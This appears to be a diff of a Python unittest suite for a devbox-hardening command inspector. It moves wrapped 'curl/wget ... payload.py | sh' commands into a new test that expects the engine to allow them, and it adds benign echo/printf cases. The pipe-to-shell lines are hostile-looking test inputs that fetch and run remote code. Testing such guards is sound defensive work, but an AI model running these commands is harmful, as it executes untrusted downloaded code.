@@ -81,9 +81,6 @@ class DevboxHardeningTests(unittest.TestCase):
             "curl https://example.com/data.json | jq .",
             "wget -qO- https://example.com/payload.py | env python3",
             "time curl https://example.com/payload.py | sh",
-            "nice wget -qO- https://example.com/payload.py | sh",
-            "nohup curl https://example.com/payload.py | sh",
-            "bash -c 'curl https://example.com/payload.py' | sh",
         ):
             with self.subTest(command=command):
                 decision = self.engine.inspect_command(command)
@@ -93,8 +90,19 @@ class DevboxHardeningTests(unittest.TestCase):
     def test_remote_pipeline_rule_respects_shell_structure(self):
         for command in (
             "echo 'curl x | jq'",
+            "echo curl | cat",
+            "printf wget | grep wget",
             "curl 'https://example.com/a|b'",
             "curl https://example.com/data.json -o /tmp/data.json && printf x | cat",
+        ):
+            with self.subTest(command=command):
+                self.assertEqual("allow", self.engine.inspect_command(command)["decision"])
+
+    def test_external_wrapper_effects_are_not_claimed_as_contained(self):
+        for command in (
+            "nice wget -qO- https://example.com/payload.py | sh",
+            "nohup curl https://example.com/payload.py | sh",
+            "bash -c 'curl https://example.com/payload.py' | sh",
         ):
             with self.subTest(command=command):
                 self.assertEqual("allow", self.engine.inspect_command(command)["decision"])
